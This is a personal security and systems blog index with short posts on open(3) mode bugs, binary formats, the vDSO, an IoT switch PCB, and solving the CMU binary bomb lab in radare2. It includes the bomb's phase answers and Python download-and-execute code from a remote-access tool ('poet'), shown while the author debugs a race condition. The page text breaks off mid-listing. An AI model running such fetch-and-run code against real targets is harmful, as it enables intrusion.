
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Mark Mossberg&#8217;s Blog</title>
  <meta name="author" content="Mark Mossberg">

  
  <meta name="description" content="for a variadic function, there is no way to tell how many arguments you
were actually passed. need some out of band method. open(3) -> flag &amp; &hellip;&#8221;>
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://mark.systems/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Mark Mossberg's Blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-36552439-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Mark Mossberg&#8217;s Blog</a></h1>
  
    <h2>Hacker Nonsense</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="mark.systems">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/about">About</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/projects">Projects</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/08/18/asking-what-if-with-open/">Asking What if With Open</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-08-18T00:10:29-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:10 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>for a variadic function, there is no way to tell how many arguments you
were actually passed. need some out of band method.
    open(3) -> flag &amp; O_CREAT
    printf(3) -> format string characters</p>

<p>open has a 2 arg and a 3 arg form
3 arg form is if you use o_creat, you need to specify th emode
but i wondered, who is enforcing that?
the compiler doesn&rsquo;t care, to it, it&rsquo;s just another variadic function
what&rsquo;s to prevent a programmer from mistakenly doing open(&ldquo;path&rdquo;, O_CREATE) and forgetting the third arg
let&rsquo;s dig
first, it&rsquo;ll pass into libc.
libc doesn&rsquo;t do any checks. it simply detects whether to get a third arg
via thing &amp; O_CREAT and calls va_arg to get the third arg. va_arg is a dumb
macro that basically just dereferences memory in the right spot on the stack
if it wasn&rsquo;t given, oh well, va_args is going to return random memory
so if libc doesn&rsquo;t check , who&rsquo;s next? well, it&rsquo;s the kernel!
look at fs/open.c to walk through the function calls to find where mode
is validated. mode is actually not used much. there&rsquo;s an interesting line
where it&rsquo;s anded with something and then or&rsquo;d with something. i presume that
and is chopping off the high bits since the valid values of mode
are up to 00700, there&rsquo;s no reason to keep higher than the 4th octal digit
that&rsquo;s a form of validation. but it will still cause incorrect results because you&rsquo;ve
essentially used a random number as your mode&hellip;
and indeed that&rsquo;s what happened! the kernel</p>

<p>interesting implications. no error anyway, the only way you&rsquo;d see it is if
you looked at the permissions of the created file. security implications?
could there be projects out there that possibly create files that got
randomly set to too openly viewable? WRITEABLE?</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/08/14/learning-trivia-about-mach0/">Buffers and Binary Formats</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-08-14T11:55:42-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:55 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>main point: everything isn&rsquo;t linux. in my experience most people know
linux the best because it&rsquo;s a good learning tool, it&rsquo;s what&rsquo;s used in school
etc, however it&rsquo;s important not to assume every os works that way. there
are other os&rsquo;s out there that do things differently!</p>

<p>local buffers
on linux the buffer is literally encoded into the instructino
however on os x, in mach0, buffer actually still takes up space in a data
section and is copied onto the stack versus an immediate move.</p>

<p>notice how on linux your local buffer won&rsquo;t take space in the rodata
if you look at the rodata, it&rsquo;s not there</p>

<p>if you run strings on mach0 you see the string there</p>

<p>this might be a lot faster on linux then?</p>

<p>overview</p>

<p>local buffers, defined for beginner c programmers. diff bt local buf + global buf (runtime va binary)
linux local buffers
    test program, disassemble, observe how string isn&rsquo;t in data sections, it&rsquo;s in the text
mach0
    it&rsquo;s actually different. observe how string isn&rsquo;t in text, it&rsquo;s still in
    data. observe how the text moves it onto the stack</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/08/13/solving-cmu-binary-bomb-with-r2/">Solving Cmu Binary Bomb With R2</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-08-13T11:03:51-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:03 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>aa</p>

<p>why isn&rsquo;t sym.read_six_numebrs showing up?</p>

<p>oh you need aaa?</p>

<p>tons of options
here are the common ones</p>

<p>aaa
afl and grep
is
i
pdf needs @
sf doesn&rsquo;t need @
afna (where am i)
afi
afo</p>

<p>find r2 works well with tmux</p>

<p>whoa visual mode is magical
but honestly&hellip;this is one of the things a gui is meant for</p>

<p>wait now disas visual mode with : for r2 commands is where it&rsquo;s at</p>

<p>debugging
start with -d</p>

<p>oo = restart/reload program
dc = continue
ds = step
dr = regs</p>

<p>phase 1: simple strcmp
Public speaking is very easy.</p>

<p>phase2</p>

<p>phase_2(<em>,
    int arr[6]
    read_six(</em>, arr)
    if arr[0] != 1; bomb</p>

<pre><code>ebx = 1 // counter
esi = arr

eax = ebx + 1

looping through array
loops from 1 to 5. at the last iter, ebx will be 6
eax is also ebx + 1
the multiplcation is (loop iteration + 1) * 

for i in range(1,6)
    if arr[i] != arr[i-1] * i + 1
        bomb
ebx   1 2 3 4 5
eax   2 3 4 5 6

arr 1 2 6 24 120 720 &lt;&lt; winner!


1 2 6

eax = 2
eax *= arr[0]
if each != arr[1]; bomb
ebx++
if ebx 



local_6 is the array

local_10 
</code></pre>

<p>read_six_numbers(<em>, int[6])
    sscanf(</em>, &ldquo;%d %d %d&hellip;.&rdquo;, int[0], int[1], &hellip;)
    if ret > 5; return else bomb</p>

<p>phase 3</p>

<p>local3 is first number
local 11 is second character
local 1 is 2nd number</p>

<p>local3 must be &lt;= 7</p>

<p>does some fucking ridiculous relatively jump, redeferencing a random pointer
into the .rodata plus a controlled value</p>

<p>8be0
8c00
8c16
8c28
8c40
8c52
8c64
8c78</p>

<p>could you hack the binary bomb?
it&rsquo;s giving you some amount of direct control over ip
you need to find somewhere in memory that has a pointer to somewhere you
can start a rop chain or something</p>

<p>nope. you can only do &lt;=7, which is odd because there&rsquo;s 8 jump pointers</p>

<p>so if i try to go for the first one</p>

<p>0 q 777</p>

<p>i feel like there&rsquo;s some other stuff in those options though</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/08/12/playing-with-vdso/">Playing With Vdso</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-08-12T12:29:58-04:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:29 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>carve vdso out of a process
you can look at it with all the regular binutils! cool!
look at all its symbols.
disas time, look at how it works
time is a very simple function
    check arg is null</p>

<p>in gdb if you break on time you get 2 breakpoints. this makes sense! there&rsquo;s
one in libc and one in vdso!</p>

<p>but wait, if you disas vdso.elf there&rsquo;s no &lsquo;time:&rsquo; function, just &lsquo;__vdso_time&rsquo;
readelf/nm says time is a weak symbol but the other ones that are actually
available with disas show up as global/text</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/14/building-a-simple-iot-light-switch/">Building a Simple IoT Light Switch, Pt. 2</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-14T15:13:07-04:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:13 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This is a pretty late post, but I wanted to show off the hardware I designed
as a follow up to the first
<a href="/blog/2015/01/18/a-simple-iot-light-switch/">&ldquo;Building a Simple IoT Light Switch&rdquo;</a>.
In that post I presented a prototype of a smart light switch I designed that
consisted of a button which triggered a small Python server running on a
Raspberry Pi to control my Phillips Hue lights over an HTTP API. It was an
extraordinarily simple design that worked well enough, how it was very
inconvenient to transport since I had to rewire the breadboard to the raspi
GPIO pins every time I moved. Since it seemed production ready
for my needs, I decided to solve this problem by using this as an opportunity
to learn PCB design and actually design a production board.</p>

<p>Special thanks go to <a href="http://nickkubasti.com/">Nick Kubasti</a> for teaching me
how to use KiCad and to <a href="http://thejohnsullivan.com/">John Sullivan</a> for helping
me with the final lab work.</p>

<p>The basic circuit I designed is below. It is merely a GPIO pin hooked up to
ground with a switch in between, and an LED and resistor for fun.</p>

<p><img src="/images/iot2/switch1.png" alt="" /></p>

<p>The code behind this configures the GPIO pin to use a pull up resistor, which
pulls the pin&rsquo;s voltage up to VCC when the button is not pressed, and down to
GND when it is. This lets the code poll for when the pin&rsquo;s value is <code>False</code>.
A more complete schematic including the pull up resistor is below. Note that
I won&rsquo;t have to implement the pull up part in my design because the Raspberry
Pi implements that internally.</p>

<p><img src="/images/iot2/switch2.png" alt="" /></p>

<p>My initial idea was to have a little board that would plug straight down into
the Pi&rsquo;s GPIO male headers with a little button and LED at the end. However,
that was really wasteful since that would block all of the pins even though
I was only using three of them (input, GND, VCC). Nick suggested a board design
that had two sets of headers: one set of female ones for plugging downwards as I
had originally thought, and one set of male ones facing upward that all the
unused pins would be forwarded to. This way, even though the downward facing
female pins are all plugged in, they can all still be accessed since the board
traces simply connect the unused female pins to the corresponding male ones.
The exception to this is GPIO pin 11, which is the one actually being used for
the switch. I just need to remember for future projects that pin 11 is
reserved. That was probably really hard to understand, so here&rsquo;s the schematic,
created with KiCad.</p>

<p><img src="/images/iot2/schematic.png" alt="" /></p>

<p>On the left you can see the two sets of 13 x 2 headers. The ones on the left
will be the female ones that plug downward into the Pi&rsquo;s male headers. The
ones on the right will be the male ones that can be used for other projects.
All those wires going around the top and bottom are the forwarded connections.
The one pin exclusively in use on the left is pin 11, which is connected to
the circuit. All the rest are unused, and wires are used to connect them to
their corresponding male header. Pins 1 and 9 are technically in use, but
since they correspond to VCC and GND, it&rsquo;s fine to forward them too.</p>

<p>The actual circuit is in the bottom left. It&rsquo;s very similar to the above
circuit diagrams, pin 11 is connected to GND (pin 9) via a switch, and
3.3V VCC (pin 1) is connected to an LED, resistor, and the same GND (pin 9).</p>

<p>The next step after creating the schematic, and assigning actual parts to each
of the components, was to design the printed circuit board (PCB). This involves
laying out the components as they will appear on the physical
silicon wafer.</p>

<p><img src="/images/iot2/pcb.png" alt="" /></p>

<p>This was a completely new area to me and it was challenging and fun to
actually draw out the board&rsquo;s traces, taking care not to intersect them,
and using the different layers when necessary. You might notice that there&rsquo;s
a seemingly random set of 1 x 2 headers in the middle of the area where the
switch goes. I added those because I noticed that the button and LED were going
to actually extend off the end of the Pi. I was concerned about how pressing
down on the button would actually flip the Pi a little bit, so Nick had an
incredible idea and suggested adding space for a pair of dud headers that
could be used as legs to support the end of the PCB that hung off the side
of the Pi.</p>

<p>After this, I was then able to pretty easily use KiCad to generate some
Gerber files to send to the fab. I chose to use
<a href="https://oshpark.com/">OshPark</a> based on Nick&rsquo;s recommendation, and they turned
out to be a great option. I was able to get three copies of my board, with
free shipping for &lt;$8!</p>

<p>After waiting a couple of weeks for the boards to come in, John helped me
solder everything together to finish up this project. During this process
we noticed one design mistake: the layout of the switch was actually <em>way</em>
too big for the switch we had on hand, but that didn&rsquo;t turn out to be a serious
issue.</p>

<p><img src="/images/iot2/mistake.jpg" alt="" /></p>

<p>There are some pictures of the final product:</p>

<p><img src="/images/iot2/final1.jpg" alt="" />
<img src="/images/iot2/final2.jpg" alt="" />
<img src="/images/iot2/final3.jpg" alt="" />
<img src="/images/iot2/final4.jpg" alt="" /></p>

<p>Here&rsquo;s a video of it in action:</p>

<blockquote class="instagram-media" data-instgrm-version="4" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:50% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAAGFBMVEUiIiI9PT0eHh4gIB4hIBkcHBwcHBwcHBydr+JQAAAACHRSTlMABA4YHyQsM5jtaMwAAADfSURBVDjL7ZVBEgMhCAQBAf//42xcNbpAqakcM0ftUmFAAIBE81IqBJdS3lS6zs3bIpB9WED3YYXFPmHRfT8sgyrCP1x8uEUxLMzNWElFOYCV6mHWWwMzdPEKHlhLw7NWJqkHc4uIZphavDzA2JPzUDsBZziNae2S6owH8xPmX8G7zzgKEOPUoYHvGz1TBCxMkd3kwNVbU0gKHkx+iZILf77IofhrY1nYFnB/lQPb79drWOyJVa/DAvg9B/rLB4cC+Nqgdz/TvBbBnr6GBReqn/nRmDgaQEej7WhonozjF+Y2I/fZou/qAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://instagram.com/p/37ZQ8_n86u/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_top">A video posted by Mark Mossberg (@mssbrg)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2015-06-14T23:29:39+00:00">Jun 14, 2015 at 4:29pm PDT</time></p></div></blockquote>


<script async defer src="//platform.instagram.com/en_US/embeds.js"></script>


<p>Thanks for reading! I have two extra boards I&rsquo;m not doing anything with, so
if you happen to have a Raspberry Pi and some Hue lights, I&rsquo;d be happy to give
you the hardware and software for your own DIY light switch.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/07/off-to-the-python-internals-races/">Off to the (Python Internals) Races</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-07'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:00 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This post is about an interesting race condition bug I ran into when working
on a small feature improvement for
<a href="http://github.com/mossberg/poet">poet</a> a while ago
that I thought was
worth writing a blog post about.</p>

<p>In particular, I was improving the download-and-execute capability of poet
which, if you couldn&rsquo;t tell, downloads a file from the internet and executes
it on the target. At the original time of writing, I didn&rsquo;t know about
the python <code>tempfile</code> module and since I recently learned about it, I wanted
to integrate it into poet as it would be a significant improvement to
the original implementation. The initial patch looked like this.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">r</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">inp</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'><span class="k">with</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">NamedTemporaryFile</span><span class="p">()</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">fchmod</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="n">stat</span><span class="o">.</span><span class="n">S_IRWXU</span><span class="p">)</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>  <span class="c"># ensure that file was actually written to disk</span>
</span><span class='line'>    <span class="n">sp</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">devnull</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">),</span> <span class="n">stderr</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This code downloads a file from the internet, writes it to a tempfile on
disk, sets the permissions to executable, executes it in a subprocess.
In testing this code, I observed some puzzling behavior: the file was
never actually getting executed because it was suddenly ceasing to
exist! I noticed though that when I used
<code>subprocess.call()</code> or used <code>.wait()</code> on the <code>Popen()</code>, it would work
fine, however I intentionally didn&rsquo;t want the client to block while the
file executed its arbitrary payload, so I couldn&rsquo;t use those functions.</p>

<p>The fact that the execution would work when the <code>Popen</code> call waited for
the process and didn&rsquo;t work otherwise suggests that there was something
going on between the time it took to execute the child and the time it took
for the <code>with</code> block to end and delete the file, which is <code>tempfile</code>&rsquo;s
default behavior. More specifically, the
file must have been deleted at some point before the <code>exec</code> syscall loaded
the file from disk into memory. Let&rsquo;s take a look at the implementation of
<code>subprocess.Popen()</code> to see if we can gain some more insight:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">_execute_child</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">executable</span><span class="p">,</span> <span class="n">preexec_fn</span><span class="p">,</span> <span class="n">close_fds</span><span class="p">,</span>
</span><span class='line'>                           <span class="n">cwd</span><span class="p">,</span> <span class="n">env</span><span class="p">,</span> <span class="n">universal_newlines</span><span class="p">,</span>
</span><span class='line'>                           <span class="n">startupinfo</span><span class="p">,</span> <span class="n">creationflags</span><span class="p">,</span> <span class="n">shell</span><span class="p">,</span> <span class="n">to_close</span><span class="p">,</span>
</span><span class='line'>                           <span class="n">p2cread</span><span class="p">,</span> <span class="n">p2cwrite</span><span class="p">,</span>
</span><span class='line'>                           <span class="n">c2pread</span><span class="p">,</span> <span class="n">c2pwrite</span><span class="p">,</span>
</span><span class='line'>                           <span class="n">errread</span><span class="p">,</span> <span class="n">errwrite</span><span class="p">):</span>
</span><span class='line'>            <span class="sd">&quot;&quot;&quot;Execute program (POSIX version)&quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'>            <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">try</span><span class="p">:</span>
</span><span class='line'>                <span class="k">try</span><span class="p">:</span>
</span><span class='line'>                    <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span><span class='line'>                    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span>
</span><span class='line'>                    <span class="k">except</span><span class="p">:</span>
</span><span class='line'>                        <span class="k">if</span> <span class="n">gc_was_enabled</span><span class="p">:</span>
</span><span class='line'>                            <span class="n">gc</span><span class="o">.</span><span class="n">enable</span><span class="p">()</span>
</span><span class='line'>                        <span class="k">raise</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">_child_created</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>                    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>                        <span class="c"># Child</span>
</span><span class='line'>                        <span class="k">try</span><span class="p">:</span>
</span><span class='line'>                            <span class="c"># Close parent&#39;s pipe ends</span>
</span><span class='line'>                            <span class="k">if</span> <span class="n">p2cwrite</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">os</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="n">p2cwrite</span><span class="p">)</span>
</span><span class='line'>                            <span class="k">if</span> <span class="n">c2pread</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">os</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="n">c2pread</span><span class="p">)</span>
</span><span class='line'>                            <span class="k">if</span> <span class="n">errread</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">os</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="n">errread</span><span class="p">)</span>
</span><span class='line'>                            <span class="n">os</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="n">errpipe_read</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                            <span class="c"># When duping fds, if there arises a situation</span>
</span><span class='line'>                            <span class="c"># where one of the fds is either 0, 1 or 2, it</span>
</span><span class='line'>                            <span class="c"># is possible that it is overwritten (#12607).</span>
</span><span class='line'>                            <span class="k">if</span> <span class="n">c2pwrite</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">c2pwrite</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">dup</span><span class="p">(</span><span class="n">c2pwrite</span><span class="p">)</span>
</span><span class='line'>                            <span class="k">if</span> <span class="n">errwrite</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">errwrite</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">errwrite</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">dup</span><span class="p">(</span><span class="n">errwrite</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                            <span class="c"># Dup fds for child</span>
</span><span class='line'>                            <span class="k">def</span> <span class="nf">_dup2</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span><span class='line'>                                <span class="c"># dup2() removes the CLOEXEC flag but</span>
</span><span class='line'>                                <span class="c"># we must do it ourselves if dup2()</span>
</span><span class='line'>                                <span class="c"># would be a no-op (issue #10806).</span>
</span><span class='line'>                                <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="n">b</span><span class="p">:</span>
</span><span class='line'>                                    <span class="bp">self</span><span class="o">.</span><span class="n">_set_cloexec_flag</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
</span><span class='line'>                                <span class="k">elif</span> <span class="n">a</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>                                    <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
</span><span class='line'>                            <span class="n">_dup2</span><span class="p">(</span><span class="n">p2cread</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>                            <span class="n">_dup2</span><span class="p">(</span><span class="n">c2pwrite</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>                            <span class="n">_dup2</span><span class="p">(</span><span class="n">errwrite</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                            <span class="c"># Close pipe fds.  Make sure we don&#39;t close the</span>
</span><span class='line'>                            <span class="c"># same fd more than once, or standard fds.</span>
</span><span class='line'>                            <span class="n">closed</span> <span class="o">=</span> <span class="p">{</span> <span class="bp">None</span> <span class="p">}</span>
</span><span class='line'>                            <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">[</span><span class="n">p2cread</span><span class="p">,</span> <span class="n">c2pwrite</span><span class="p">,</span> <span class="n">errwrite</span><span class="p">]:</span>
</span><span class='line'>                                <span class="k">if</span> <span class="n">fd</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">closed</span> <span class="ow">and</span> <span class="n">fd</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
